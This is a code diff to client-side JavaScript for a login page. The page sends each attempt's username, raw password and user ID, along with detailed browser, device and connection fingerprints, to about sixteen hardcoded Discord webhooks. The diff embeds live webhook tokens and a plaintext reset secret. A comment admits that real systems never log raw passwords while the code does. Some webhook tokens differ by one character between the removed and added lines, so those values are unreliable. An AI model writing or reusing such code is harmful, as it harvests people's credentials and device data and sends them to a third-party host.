@@ -2111,24 +2111,24 @@ let whitelist = []; // To store data from Whitelist.json
 const WHITELIST_URL = "https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json";
 const RESET_CODE_SECRET = 'Reset.Counter.2579'; // The secret code for resetting attempts
 
-// Discord Webhook URLs
+// All Discord Webhook URLs, mapped to the channel names from the screenshot
 const webhooks = {
-    userInformation: "https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3",
-    browserInformation: "https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP",
-    deviceInformation: "https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F",
-    connectionInformation: "https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR3SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D",
-    sessionInformation: "https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk",
-    resetInformation: "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq",
-    correctInformation: "https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip",
-    incorrectInformation: "https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB",
-    usernameInformation: "https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU",
-    passwordInformation: "https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI",
-    identifierInformation: "https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOYWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA",
-    invaildUsernameInformation: "https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp",
-    invaildPasswordInformation: "https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp",
-    invaildIdentifierInformation: "https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5",
-    attemptCounterInformation: "https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw",
-    attemptExceededInformation: "https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPH0IhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ"
+    usernameInformation: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
+    passwordInformation: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
+    identifierInformation: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
+    invaildUsernameInformation: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
+    invaildPasswordInformation: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
+    invaildIdentifierInformation: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
+    attemptCounterInformation: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
+    attemptExceededInformation: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ',
+    resetInformation: 'https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq', // This seems to be the "RESET_INFORMATION" channel
+    correctInformation: 'https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip',
+    incorrectInformation: 'https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB',
+    userInformation: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
+    browserInformation: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
+    deviceInformation: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
+    connectionInformation: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
+    sessionInformation: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
 };
 
 
@@ -2211,7 +2211,7 @@ async function sendWebhook(url, embeds, username = "System Logger") {
         ...embed,
         timestamp: embed.timestamp || new Date().toISOString(),
         footer: {
-            text: `${username} | ${navigator.userAgent.substring(0, 250)}...` // Truncate UA for footer
+            text: `${username} | ${navigator.userAgent.substring(0, Math.min(250, navigator.userAgent.length))}...` // Truncate UA for footer
         }
     }));
 
@@ -2390,30 +2390,33 @@ function getDeviceDetailedInfo() {
 
 function getConnectionDetailedInfo() {
     const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    const nav = navigator; // Use a shorthand for clarity
     const fields = [
-        { name: "Online Status", value: navigator.onLine ? "Online" : "Offline", inline: true },
-        { name: "Effective Connection Type", value: connection?.effectiveType || "N/A", inline: true },
-        { name: "Round-Trip Time (ms)", value: connection?.rtt ? `${connection.rtt}ms` : "N/A", inline: true },
-        { name: "Downlink (Mbps)", value: connection?.downlink ? `${connection.downlink}Mbps` : "N/A", inline: true },
-        { name: "Save Data Mode", value: connection?.saveData ? "Enabled" : "Disabled", inline: true },
-        { name: "Connection Type", value: connection?.type || "N/A", inline: true },
-        { name: "Downlink Max (Mbps)", value: connection?.downlinkMax ? `${connection.downlinkMax}Mbps` : "N/A", inline: true },
-        { name: "Max Concurrent Connections (Est.)", value: navigator.maxConnections || "N/A", inline: true }, // Deprecated but might exist
-        { name: "IP Address (Client-side estimate)", value: "N/A (Client-side JS cannot get public IP directly)", inline: false },
+        { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
+        { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true },
+        { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true },
+        { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true },
+        { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true },
+        { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },
+        { name: "IP Address", value: "N/A (Client-side JS cannot detect public IP directly)", inline: false },
+        { name: "VPN Detected", value: "N/A (Requires server-side lookup)", inline: true },
+        { name: "Proxy Detected", value: "N/A (Requires server-side lookup)", inline: true },
+        { name: "Public IPv6", value: "N/A (Client-side JS cannot detect directly)", inline: false },
+        { name: "Local IP Addresses", value: "N/A (Requires WebRTC or server-side interaction with user consent)", inline: false },
+        { name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },
+        { name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true },
+        { name: "Network Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true }, // Non-standard/deprecated
+        { name: "Effective Network Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true }, // Non-standard/deprecated
         { name: "Web Transport API", value: !!window.WebTransport ? "Yes" : "No", inline: true },
-        { name: "Beacon API", value: !!navigator.sendBeacon ? "Yes" : "No", inline: true },
-        { name: "Background Sync API", value: !!('serviceWorker' in navigator && navigator.serviceWorker && navigator.serviceWorker.ready && navigator.serviceWorker.ready.then && 'sync' in (navigator.serviceWorker.controller || {})) ? "Yes" : "No", inline: true },
+        { name: "Beacon API", value: !!nav.sendBeacon ? "Yes" : "No", inline: true },
+        { name: "Background Sync API", value: !!('serviceWorker' in nav && nav.serviceWorker && nav.serviceWorker.ready && nav.serviceWorker.ready.then && 'sync' in (nav.serviceWorker.controller || {})) ? "Yes" : "No", inline: true },
         { name: "Fetch Priority API", value: !!(new Request('/', {priority: 'high'})).priority ? "Yes" : "No", inline: true },
-        { name: "DNS Prefetching Support", value: "Available", inline: true }, // Generally available in modern browsers
-        { name: "Preload Support", value: "Available", inline: true }, // Generally available in modern browsers
+        { name: "DNS Prefetching Support", value: "Available", inline: true },
+        { name: "Preload Support", value: "Available", inline: true },
         { name: "Prerender Support", value: !!document.createElement('link').relList?.supports('prerender') ? "Yes" : "No", inline: true },
-        { name: "Network Information API", value: !!navigator.connection ? "Yes" : "No", inline: true },
-        { name: "Service Worker Status", value: 'serviceWorker' in navigator ? (navigator.serviceWorker.controller ? 'Active' : 'Supported') : 'Not Supported', inline: true },
-        { name: "Bluetooth Enabled", value: navigator.bluetooth?.getAvailability ? "Check Required" : "N/A", inline: true }, // Requires permissions
-        { name: "Geoloc. Permission State", value: "N/A (check via Permissions API if available)", inline: true }, // Requires async check
-        { name: "Media Access Permission", value: "N/A (check via Permissions API if available)", inline: true },
-        { name: "Bandwidth Estimation", value: connection?.bandwidth ? `${connection.bandwidth} Mbps` : "N/A", inline: true }, // Deprecated, but might still exist
-        { name: "ISP (Estimated)", value: "N/A (Requires server-side lookup)", inline: true } // Cannot get client-side
+        { name: "Network Information API", value: !!nav.connection ? "Yes" : "No", inline: true },
+        { name: "Service Worker Status", value: 'serviceWorker' in nav ? (nav.serviceWorker.controller ? 'Active' : 'Supported') : 'Not Supported', inline: true },
+        { name: "Bluetooth Enabled", value: nav.bluetooth?.getAvailability ? "Check Required" : "N/A", inline: true }, // Requires permissions
     ];
     return fields;
 }
@@ -2473,8 +2476,10 @@ async function logAttemptsExceeded(userName, inputUsername, inputPassword, input
         { name: "Timestamp", value: new Date().toLocaleString(), inline: false },
         { name: "Attempts Exceeded", value: "Yes", inline: true },
         { name: "System Locked", value: "Yes", inline: true },
-        ...browserInfoFields.slice(0, 10).map(f => ({ name: `Browser - ${f.name}`, value: f.value, inline: f.inline })), // Subset for brevity in summary log
-        ...deviceInfoFields.slice(0, 10).map(f => ({ name: `Device - ${f.name}`, value: f.value, inline: f.inline })) // Subset for brevity
+        // Include a subset of comprehensive info for context in this summary log
+        ...browserInfoFields.slice(0, 5).map(f => ({ name: `Browser - ${f.name}`, value: f.value, inline: f.inline })),
+        ...deviceInfoFields.slice(0, 5).map(f => ({ name: `Device - ${f.name}`, value: f.value, inline: f.inline })),
+        ...connectionInfoFields.slice(0, 5).map(f => ({ name: `Connection - ${f.name}`, value: f.value, inline: f.inline }))
     ];
 
     const embeds = createEmbedsFromFields("🚨 Login Attempts Exceeded", 0xDC143C, fields, "All login attempts have been exhausted. System is now locked.");
@@ -2495,7 +2500,7 @@ async function resetCounter() {
     const deviceInfoFields = getDeviceDetailedInfo();
     const connectionInfoFields = getConnectionDetailedInfo();
 
-    // Reset Information Logging (detailed system snapshot when reset is attempted)
+    // RESET_INFORMATION Logging (detailed system snapshot when reset is attempted)
     const resetInfoFields = [
         { name: "Attempted Name", value: user.name || "N/A", inline: true },
         { name: "Attempted Username", value: currentUsername, inline: true },
@@ -2504,6 +2509,7 @@ async function resetCounter() {
         { name: "Entered Reset Code", value: enteredCode, inline: false },
         { name: "Reset Attempt Result", value: isCorrect ? "SUCCESS" : "FAILED", inline: true },
         { name: "Timestamp", value: new Date().toLocaleString(), inline: false },
+        // Append all detailed browser, device, and connection info
         ...browserInfoFields.map(f => ({ name: `Browser - ${f.name}`, value: f.value, inline: f.inline })),
         ...deviceInfoFields.map(f => ({ name: `Device - ${f.name}`, value: f.value, inline: f.inline })),
         ...connectionInfoFields.map(f => ({ name: `Connection - ${f.name}`, value: f.value, inline: f.inline }))
@@ -2656,37 +2662,39 @@ async function attemptLogin() {
   const deviceInfoFields = getDeviceDetailedInfo();
   const connectionInfoFields = getConnectionDetailedInfo();
 
-  // 1. USERNAME_INFORMATION
+  // --- BEGIN LOGGING FOR INDIVIDUAL INPUTS AND ENVIRONMENTAL DATA (ATTEMPT START) ---
+
+  // USERNAME_INFORMATION (Specific channel for username input)
   await sendWebhook(webhooks.usernameInformation, createEmbedsFromFields(
       "📝 Username Attempt", 0xADD8E6, [
           { name: "Attempted Username", value: username || '[empty]', inline: true },
           { name: "Current Attempts Left", value: `${attempts}`, inline: true },
           { name: "Timestamp", value: new Date().toLocaleString(), inline: false },
-          ...browserInfoFields.slice(0, 5).map(f => ({ name: `Browser - ${f.name}`, value: f.value, inline: f.inline })),
+          ...browserInfoFields.slice(0, 5).map((f, i) => ({ name: `Browser (${i+1}) - ${f.name}`, value: f.value, inline: true })), // Subset for context
       ]
   ));
 
-  // 2. PASSWORD_INFORMATION
+  // PASSWORD_INFORMATION (Specific channel for password input)
   await sendWebhook(webhooks.passwordInformation, createEmbedsFromFields(
       "📝 Password Attempt", 0xADD8E6, [
-          { name: "Attempted Password", value: password || '[empty]', inline: true },
+          { name: "Attempted Password", value: password || '[empty]', inline: true }, // Note: Real systems hash/never log raw passwords
           { name: "Current Attempts Left", value: `${attempts}`, inline: true },
           { name: "Timestamp", value: new Date().toLocaleString(), inline: false },
-          ...deviceInfoFields.slice(0, 5).map(f => ({ name: `Device - ${f.name}`, value: f.value, inline: f.inline })),
+          ...deviceInfoFields.slice(0, 5).map((f, i) => ({ name: `Device (${i+1}) - ${f.name}`, value: f.value, inline: true })), // Subset for context
       ]
   ));
 
-  // 3. IDENTIFIER_INFORMATION
+  // IDENTIFIER_INFORMATION (Specific channel for User ID input)
   await sendWebhook(webhooks.identifierInformation, createEmbedsFromFields(
       "📝 User ID Attempt", 0xADD8E6, [
           { name: "Attempted User ID", value: userID || '[empty]', inline: true },
           { name: "Current Attempts Left", value: `${attempts}`, inline: true },
           { name: "Timestamp", value: new Date().toLocaleString(), inline: false },
-          ...connectionInfoFields.slice(0, 5).map(f => ({ name: `Connection - ${f.name}`, value: f.value, inline: f.inline })),
+          ...connectionInfoFields.slice(0, 5).map((f, i) => ({ name: `Connection (${i+1}) - ${f.name}`, value: f.value, inline: true })), // Subset for context
       ]
   ));
   
-  // 4. USER_INFORMATION (10+ fields)
+  // USER_INFORMATION (10+ fields for overall user context)
   await sendWebhook(webhooks.userInformation, createEmbedsFromFields(
       "👤 Login Attempt Details", 0x00BFFF, [
           { name: "Submitted Username", value: username || "[empty]", inline: true },
@@ -2702,22 +2710,22 @@ async function attemptLogin() {
       ]
   ));
 
-  // 5. BROWSER_INFORMATION (25+ fields, potentially multiple embeds)
+  // BROWSER_INFORMATION (25+ fields, multiple embeds if needed)
   await sendWebhook(webhooks.browserInformation, createEmbedsFromFields(
-      "🌐 Detailed Browser Information", 0x90EE90, browserInfoFields
+      "🌐 Detailed Browser Information (Login Attempt)", 0x90EE90, browserInfoFields
   ));
 
-  // 6. DEVICE_INFORMATION (25+ fields, potentially multiple embeds)
+  // DEVICE_INFORMATION (25+ fields, multiple embeds if needed)
   await sendWebhook(webhooks.deviceInformation, createEmbedsFromFields(
-      "🖥️ Detailed Device Information", 0xFFD700, deviceInfoFields
+      "🖥️ Detailed Device Information (Login Attempt)", 0xFFD700, deviceInfoFields
   ));
 
-  // 7. CONNECTION_INFORMATION (25+ fields, potentially multiple embeds)
+  // CONNECTION_INFORMATION (25+ fields, multiple embeds if needed)
   await sendWebhook(webhooks.connectionInformation, createEmbedsFromFields(
-      "🔗 Detailed Connection Information", 0xFFC0CB, connectionInfoFields
+      "🔗 Detailed Connection Information (Login Attempt)", 0xFFC0CB, connectionInfoFields
   ));
 
-  // 8. ATTEMPT_COUNTER_INFORMATION
+  // ATTEMPT_COUNTER_INFORMATION
   await sendWebhook(webhooks.attemptCounterInformation, createEmbedsFromFields(
       "🔄 Attempt Counter Update", 0xFF4500, [
           { name: "User Context", value: username || 'unknown', inline: true },
@@ -2725,6 +2733,8 @@ async function attemptLogin() {
           { name: "Timestamp", value: new Date().toLocaleString(), inline: false }
       ]
   ));
+
+  // --- END LOGGING FOR INDIVIDUAL INPUTS AND ENVIRONMENTAL DATA (ATTEMPT START) ---
 
 
   if (!username || !password || !userID) {
@@ -2736,7 +2746,7 @@ async function attemptLogin() {
     const errorMessage = `Please fill all fields. Missing: ${missingFields.join(", ")}`;
     showError(errorMessage);
     
-    // 9. INCORRECT_INFORMATION (for general incorrectness)
+    // INCORRECT_INFORMATION (for general incorrectness)
     await sendWebhook(webhooks.incorrectInformation, createEmbedsFromFields(
         "❌ Login Failed: Missing Fields", 0xFF0000, [
             { name: "Attempted Username", value: username || "[empty]", inline: true },
@@ -2813,7 +2823,7 @@ async function attemptLogin() {
     } else {
         finalFailedMessage += `Invalid credentials (username, password, or user ID combination is incorrect).`; 
     }
-    // 9. INCORRECT_INFORMATION (for general incorrectness)
+    // INCORRECT_INFORMATION (for general incorrectness)
     await sendWebhook(webhooks.incorrectInformation, createEmbedsFromFields(
         "❌ Login Failed: Incorrect Credentials", 0xFF0000, [
             { name: "Attempted Username", value: username, inline: true },
@@ -2840,7 +2850,7 @@ async function successfulLogin(username, userID) {
   });
   saveLoginHistoryToStorage(); // Save history to local storage
 
-  // 10. CORRECT_INFORMATION
+  // CORRECT_INFORMATION
   const correctLoginEmbeds = createEmbedsFromFields(
       "✅ Successful Login", 0x00FF00, [
           { name: "User", value: username, inline: true },
@@ -2850,7 +2860,7 @@ async function successfulLogin(username, userID) {
   );
   await sendWebhook(webhooks.correctInformation, correctLoginEmbeds);
   
-  // 11. SESSION_INFORMATION (Aggregates ~90+ fields, split into multiple embeds)
+  // SESSION_INFORMATION (Aggregates ~90+ fields, split into multiple embeds)
   const sessionInfoFields = [
       { name: "Logged-in User", value: username, inline: true },
       { name: "User ID", value: userID, inline: true },
